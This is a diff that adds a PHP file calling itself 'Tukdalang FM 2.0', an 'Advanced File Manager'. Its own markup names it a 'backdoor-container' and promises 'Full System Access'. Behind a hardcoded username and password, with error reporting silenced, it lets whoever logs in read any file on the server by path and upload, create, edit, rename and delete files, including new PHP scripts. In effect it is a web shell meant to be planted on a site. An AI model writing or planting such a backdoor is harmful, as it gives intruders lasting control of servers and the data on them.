@@ -1,0 +1,796 @@
+<?php
+// ==================================================
+// ADVANCED PHP FILE MANAGER
+// Version: Tukdalang FM 2.0
+// ==================================================
+
+error_reporting(0);
+session_start();
+
+// === SIMPLE AUTHENTICATION ===
+if (!isset($_SESSION['fm_loggedin'])) {
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        if ($_POST['username'] === 'Tukdalang' && $_POST['password'] === 'Toto000') {
+            $_SESSION['fm_loggedin'] = true;
+            $_SESSION['login_time'] = time();
+            $_SESSION['client_ip'] = $_SERVER['REMOTE_ADDR'];
+        } else {
+            $error = "Invalid username or password!";
+        }
+    }
+    
+    if (!isset($_SESSION['fm_loggedin'])) {
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>File Manager Login</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    font-family: Arial, sans-serif;
+                    background: url(https://i.pinimg.com/originals/fd/da/ed/fddaedf &.gif);
+                    background-repeat: no-repeat;
+                    height: 100vh;
+                    background-size: cover;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                }
+                .login-container {
+                    background: #0003359e;
+                    padding: 40px;
+                    backdrop-filter: blur(50px);
+                    border-radius: 15px;
+                    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+                    width: 100%;
+                    max-width: 400px;
+                    color: white;
+                }
+                .login-header {
+                    text-align: center;
+                    margin-bottom: 30px;
+                }
+                .login-header h2 {
+                    color: #333;
+                    margin-bottom: 10px;
+                }
+                .login-header p {
+                    color: #666;
+                    font-size: 14px;
+                }
+                .form-group {
+                    margin-bottom: 20px;
+                }
+                .form-group label {
+                    display: block;
+                    margin-bottom: 5px;
+                    color: #333;
+                    font-weight: bold;
+                }
+                .form-group input {
+                    width: 100%;
+                    padding: 12px 15px;
+                    border: 2px solid #ddd;
+                    border-radius: 8px;
+                    font-size: 14px;
+                    transition: border-color 0.3s;
+                }
+                .form-group input:focus {
+                    outline: none;
+                    border-color: #667eea;
+                }
+                .login-btn {
+                    width: 100%;
+                    background: linear-gradient(135deg, #000eff 0%, #000eff 100%);
+                    color: white;
+                    padding: 12px;
+                    border: none;
+                    border-radius: 8px;
+                    font-size: 16px;
+                    cursor: pointer;
+                    transition: transform 0.2s;
+                }
+                .login-btn:hover {
+                    transform: translateY(-2px);
+                }
+                .error-message {
+                    background: #ffebee;
+                    color: #c62828;
+                    padding: 10px;
+                    border-radius: 5px;
+                    margin-bottom: 20px;
+                    text-align: center;
+                    border: 1px solid #ffcdd2;
+                }
+                .footer {
+                    text-align: center;
+                    margin-top: 30px;
+                    padding-top: 20px;
+                    border-top: 1px solid #eee;
+                    color: #888;
+                    font-size: 12px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="login-container">
+                <div class="login-header">
+                    <h2>�=� File Manager Access</h2>
+                    <p>Enter credentials to continue</p>
+                </div>
+                '.($error ? '<div class="error-message">'.$error.'</div>' : '').'
+                <form method="POST">
+                    <div class="form-group">
+                        <label for="username">Username:</label>
+                        <input type="text" id="username" name="username" placeholder="Enter username" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password:</label>
+                        <input type="password" id="password" name="password" placeholder="Enter password" required>
+                    </div>
+                    <button type="submit" class="login-btn">Login</button>
+                </form>
+                <div class="footer">
+                    Powered by Tukdalang &copy; 2025
+                </div>
+            </div>
+        </body>
+        </html>';
+        exit;
+    }
+}
+
+// === FILE MANAGER FUNCTIONS ===
+$current_path = isset($_GET['path']) ? $_GET['path'] : '.';
+$current_path = realpath($current_path) ?: '.';
+
+// Handle file content reading via PHP (MUST BE BEFORE OTHER OPERATIONS)
+// This reads the RAW file content, not the executed/rendered output
+if (isset($_GET['action']) && $_GET['action'] === 'getfile' && isset($_GET['file'])) {
+    $file = $_GET['file'];
+    if (file_exists($file) && is_file($file) && is_readable($file)) {
+        header('Content-Type: text/plain; charset=UTF-8');
+        header('Cache-Control: no-cache, no-store, must-revalidate');
+        header('Pragma: no-cache');
+        header('Expires: 0');
+        echo file_get_contents($file);
+        exit;
+    } else {
+        header('HTTP/1.1 404 Not Found');
+        echo 'Error: File not found or not readable';
+        exit;
+    }
+}
+
+// Handle file operations
+if (isset($_GET['action'])) {
+    switch ($_GET['action']) {
+        case 'delete':
+            if (isset($_GET['file'])) {
+                $file = $_GET['file'];
+                if (is_file($file)) {
+                    unlink($file);
+                } elseif (is_dir($file)) {
+                    deleteDirectory($file);
+                }
+                header('Location: ?path=' . urlencode(dirname($file)));
+                exit;
+            }
+            break;
+            
+        case 'mkdir':
+            if (isset($_POST['dirname'])) {
+                $new_dir = $current_path . '/' . $_POST['dirname'];
+                mkdir($new_dir, 0755, true);
+                header('Location: ?path=' . urlencode($current_path));
+                exit;
+            }
+            break;
+            
+        case 'createfile':
+            if (isset($_POST['filename']) && isset($_POST['filecontent'])) {
+                $new_file = $current_path . '/' . $_POST['filename'];
+                file_put_contents($new_file, $_POST['filecontent']);
+                header('Location: ?path=' . urlencode($current_path));
+                exit;
+            }
+            break;
+            
+        case 'savefile':
+            if (isset($_POST['filepath']) && isset($_POST['filecontent'])) {
+                file_put_contents($_POST['filepath'], $_POST['filecontent']);
+                header('Location: ?path=' . urlencode(dirname($_POST['filepath'])));
+                exit;
+            }
+            break;
+            
+        case 'rename':
+            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
+                $old_path = $current_path . '/' . $_POST['oldname'];
+                $new_path = $current_path . '/' . $_POST['newname'];
+                rename($old_path, $new_path);
+                header('Location: ?path=' . urlencode($current_path));
+                exit;
+            }
+            break;
+    }
+}
+
+// Handle file upload
+if (isset($_FILES['file'])) {
+    $target_file = $current_path . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
+        header('Location: ?path=' . urlencode($current_path));
+        exit;
+    }
+}
+
+// Get files and directories
+$items = [];
+if (is_dir($current_path)) {
+    $files = scandir($current_path);
+    foreach ($files as $file) {
+        if ($file == '.' || $file == '..') continue;
+        
+        $full_path = $current_path . '/' . $file;
+        $items[] = [
+            'name' => $file,
+            'path' => $full_path,
+            'is_dir' => is_dir($full_path),
+            'size' => is_file($full_path) ? filesize($full_path) : 0,
+            'modified' => filemtime($full_path),
+            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
+            'extension' => pathinfo($full_path, PATHINFO_EXTENSION)
+        ];
+    }
+}
+
+// Sort: directories first, then files
+usort($items, function($a, $b) {
+    if ($a['is_dir'] && !$b['is_dir']) return -1;
+    if (!$a['is_dir'] && $b['is_dir']) return 1;
+    return strcmp($a['name'], $b['name']);
+});
+
+// Helper function to delete directory recursively
+function deleteDirectory($dir) {
+    if (!is_dir($dir)) return;
+    
+    $files = array_diff(scandir($dir), array('.', '..'));
+    foreach ($files as $file) {
+        $path = $dir . '/' . $file;
+        if (is_dir($path)) {
+            deleteDirectory($path);
+        } else {
+            unlink($path);
+        }
+    }
+    rmdir($dir);
+}
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager - Powered by Tukdalang</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(#212121);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .backdoor-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .user-info {
+            background: #e8f5e8;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #c8e6c9;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .header {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .header h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 2.5em;
+        }
+        .header p {
+            color: #666;
+            font-size: 16px;
+        }
+        .path-nav {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-family: monospace;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .path-nav a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .path-nav a:hover {
+            text-decoration: underline;
+        }
+        .toolbar {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        .btn-success { 
+            background: linear-gradient(135deg, #27ae60 0%, #219a52 100%); 
+        }
+        .btn-warning { 
+            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); 
+        }
+        .btn-danger { 
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); 
+        }
+        .btn-info { 
+            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%); 
+        }
+        .file-list {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .file-header {
+            display: grid;
+            grid-template-columns: 30% 12% 12% 15% 20% 11%;
+            padding: 20px;
+            background: #34495e;
+            color: white;
+            font-weight: bold;
+        }
+        .file-item {
+            display: grid;
+            grid-template-columns: 30% 12% 12% 15% 20% 11%;
+            padding: 15px 20px;
+            border-bottom: 1px solid #ecf0f1;
+            align-items: center;
+            transition: background 0.3s;
+        }
+        .file-item:hover {
+            background: #f8f9fa;
+        }
+        .file-item:last-child {
+            border-bottom: none;
+        }
+        .file-name {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .file-icon {
+            width: 24px;
+            text-align: center;
+            font-size: 18px;
+        }
+        .folder { color: #f39c12; }
+        .file { color: #667eea; }
+        .file-actions {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+        .file-actions a, .file-actions button {
+            padding: 6px 10px;
+            border-radius: 5px;
+            font-size: 11px;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            color: white;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        .file-actions a:hover, .file-actions button:hover {
+            transform: translateY(-1px);
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+        }
+        .modal-large {
+            max-width: 95%;
+        }
+        .modal h3 {
+            margin-bottom: 20px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.5em;
+        }
+        .modal input, .modal textarea {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+            transition: border-color 0.3s;
+        }
+        .modal input:focus, .modal textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .modal textarea {
+            min-height: 300px;
+            resize: vertical;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            justify-content: flex-end;
+        }
+        .upload-form {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .breadcrumb-separator {
+            color: #7f8c8d;
+            margin: 0 8px;
+        }
+        .file-type {
+            font-size: 11px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 4px 8px;
+            border-radius: 15px;
+            color: white;
+            font-weight: bold;
+        }
+        .editor-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .editor-path {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 25px;
+            color: white;
+            font-size: 14px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        .empty-folder {
+            text-align: center;
+            padding: 40px;
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="backdoor-container">
+        <div class="user-info">
+            <strong>Welcome, System Administrator!</strong> | 
+            Client IP: <?php echo $_SESSION['client_ip']; ?> | 
+            Login: <?php echo date('Y-m-d H:i:s', $_SESSION['login_time']); ?> | 
+            Session: <?php echo time() - $_SESSION['login_time']; ?>s
+        </div>
+
+        <div class="header">
+            <h1>�=�� Advanced File Manager</h1>
+            <p>Full System Access - File Management</p>
+        </div>
+
+        <div class="path-nav">
+            <div class="breadcrumb">
+                <a href="?path=.">Root</a>
+                <?php
+                $path_parts = explode('/', trim($current_path, '/'));
+                $current_path_build = '';
+                foreach ($path_parts as $part) {
+                    if ($part === '') continue;
+                    $current_path_build .= '/' . $part;
+                    echo '<span class="breadcrumb-separator">/</span>';
+                    echo '<a href="?path=' . urlencode($current_path_build) . '">' . htmlspecialchars($part) . '</a>';
+                }
+                ?>
+            </div>
+            <div style="margin-top: 10px; font-size: 14px; color: #666;">
+                <strong>Full Path:</strong> <?php echo htmlspecialchars($current_path); ?>
+            </div>
+        </div>
+
+        <div class="toolbar">
+            <button class="btn" onclick="showModal('uploadModal')">
+                �=�� Upload File
+            </button>
+            <button class="btn btn-success" onclick="showModal('mkdirModal')">
+                �=�� New Folder
+            </button>
+            <button class="btn btn-info" onclick="showModal('createFileModal')">
+                �=�� New File
+            </button>
+            <a href="?path=<?php echo urlencode(dirname($current_path)); ?>" class="btn">
+                !�� Back
+            </a>
+            <a href="?path=." class="btn">
+                �<�� Home
+            </a>
+        </div>
+
+        <!-- Upload Form -->
+        <div class="upload-form">
+            <form action="" method="post" enctype="multipart/form-data" style="display: flex; gap: 15px; align-items: center;">
+                <input type="file" name="file" required style="flex: 1; padding: 15px; border: 2px dashed #667eea; border-radius: 8px; background: #f8f9fa;">
+                <button type="submit" class="btn btn-success" style="padding: 15px 25px;">Upload File</button>
+            </form>
+        </div>
+
+        <!-- File List -->
+        <div class="file-list">
+            <div class="file-header">
+                <div>Name</div>
+                <div>Type</div>
+                <div>Size</div>
+                <div>Permissions</div>
+                <div>Modified</div>
+                <div>Actions</div>
+            </div>
+            
+            <?php if (empty($items)): ?>
+                <div class="empty-folder">
+                    �=�� This folder is empty
+                </div>
+            <?php else: ?>
+                <?php foreach ($items as $item): ?>
+                    <div class="file-item">
+                        <div class="file-name">
+                            <span class="file-icon">
+                                <?php echo $item['is_dir'] ? '�=��' : '�=��'; ?>
+                            </span>
+                            <?php if ($item['is_dir']): ?>
+                                <a href="?path=<?php echo urlencode($item['path']); ?>" style="color: #f39c12; text-decoration: none; font-weight: bold;">
+                                    <?php echo htmlspecialchars($item['name']); ?>
+                                </a>
+                            <?php else: ?>
+                                <span style="color: #667eea; font-weight: bold;"><?php echo htmlspecialchars($item['name']); ?></span>
+                            <?php endif; ?>
+                        </div>
+                        <div>
+                            <span class="file-type">
+                                <?php echo $item['is_dir'] ? 'FOLDER' : strtoupper($item['extension'] ?: 'FILE'); ?>
+                            </span>
+                        </div>
+                        <div style="font-weight: bold;">
+                            <?php echo $item['is_dir'] ? '-' : format_size($item['size']); ?>
+                        </div>
+                        <div style="font-family: monospace; font-weight: bold;"><?php echo $item['perms']; ?></div>
+                        <div style="font-size: 13px; color: #666;">
+                            <?php echo date('Y-m-d H:i', $item['modified']); ?>
+                        </div>
+                        <div class="file-actions">
+                            <?php if (!$item['is_dir']): ?>
+                                <a href="<?php echo htmlspecialchars($item['path']); ?>" target="_blank" style="background: #667eea;">View</a>
+                                <a href="<?php echo htmlspecialchars($item['path']); ?>" download style="background: #27ae60;">Download</a>
+                                <button onclick="editFile('<?php echo htmlspecialchars($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" style="background: #f39c12;">Edit</button>
+                            <?php endif; ?>
+                            <button onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')" style="background: #17a2b8;">Rename</button>
+                            <button onclick="deleteItem('<?php echo htmlspecialchars($item['path']); ?>')" style="background: #e74c3c;">Delete</button>
+                        </div>
+                    </div>
+                <?php endforeach; ?>
+            <?php endif; ?>
+        </div>
+
+        <div class="footer">
+            Powered by Tukdalang &copy; 2025
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div id="mkdirModal" class="modal">
+        <div class="modal-content">
+            <h3>�=�� Create New Folder</h3>
+            <form method="POST" action="?action=mkdir&path=<?php echo urlencode($current_path); ?>">
+                <input type="text" name="dirname" placeholder="Folder name" required>
+                <div class="modal-buttons">
+                    <button type="submit" class="btn btn-success">Create Folder</button>
+                    <button type="button" class="btn" onclick="hideModal('mkdirModal')">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="createFileModal" class="modal">
+        <div class="modal-content">
+            <h3>�=�� Create New File</h3>
+            <form method="POST" action="?action=createfile&path=<?php echo urlencode($current_path); ?>">
+                <input type="text" name="filename" placeholder="File name (example: test.php)" required>
+                <textarea name="filecontent" placeholder="File content" rows="10"></textarea>
+                <div class="modal-buttons">
+                    <button type="submit" class="btn btn-success">Create File</button>
+                    <button type="button" class="btn" onclick="hideModal('createFileModal')">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="renameModal" class="modal">
+        <div class="modal-content">
+            <h3>'� Rename Item</h3>
+            <form method="POST" action="?action=rename&path=<?php echo urlencode($current_path); ?>">
+                <input type="hidden" name="oldname" id="oldname">
+                <input type="text" name="newname" id="newname" placeholder="New name" required>
+                <div class="modal-buttons">
+                    <button type="submit" class="btn btn-warning">Rename</button>
+                    <button type="button" class="btn" onclick="hideModal('renameModal')">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="editFileModal" class="modal">
+        <div class="modal-content modal-large">
+            <div class="editor-header">
+                <h3>�=�� Edit File</h3>
+                <div class="editor-path" id="editFilePath"></div>
+            </div>
+            <form method="POST" action="?action=savefile&path=<?php echo urlencode($current_path); ?>">
+                <input type="hidden" name="filepath" id="editFilepath">
+                <textarea name="filecontent" id="editFilecontent" rows="20" placeholder="File content"></textarea>
+                <div class="modal-buttons">
+                    <button type="submit" class="btn btn-success">Save Changes</button>
+                    <button type="button" class="btn" onclick="hideModal('editFileModal')">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+        }
+        
+        function hideModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+        
+        function renameItem(oldName) {
+            document.getElementById('oldname').value = oldName;
+            document.getElementById('newname').value = oldName;
+            showModal('renameModal');
+            document.getElementById('newname').focus();
+            document.getElementById('newname').select();
+        }
+        
+        function deleteItem(filePath) {
+            if (confirm('Are you sure you want to delete this item?n' + filePath)) {
+                window.location.href = '?action=delete&file=' + encodeURIComponent(filePath) + '&path=<?php echo urlencode($current_path); ?>';
+            }
+        }
+        
+        function editFile(filePath, fileName) {
+            document.getElementById('editFilecontent').value = 'Loading file content...';
+            document.getElementById('editFilePath').textContent = filePath;
+            document.getElementById('editFilepath').value = filePath;
+            
+            // ALWAYS use PHP handler to read RAW file content
+            // This prevents PHP/HTML files from being executed/rendered
+            fetch('?action=getfile&file=' + encodeURIComponent(filePath) + '&t=' + new Date().getTime())
+                .then(response => {
+                    if (response.ok) return response.text();
+                    throw new Error('Cannot read file: ' + response.statusText);
+                })
+                .then(content => {
+                    document.getElementById('editFilecontent').value = content;
+                })
+                .catch(error => {
+                    document.getElementById('editFilecontent').value = 'Error loading file: ' + error.message;
+                });
+            
+            showModal('editFileModal');
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
+
+<?php
+// Note: getfile handler has been moved to the top of the file
+// to ensure it runs before any HTML is output
+
+// Helper function to format file size
+function format_size($size) {
+    $units = ['B', 'KB', 'MB', 'GB'];
+    $unit_index = 0;
+    while ($size >= 1024 && $unit_index < count($units) - 1) {
+        $size /= 1024;
+        $unit_index++;
+    }
+    return round($size, 2) . ' ' . $units[$unit_index];
+}
+?>
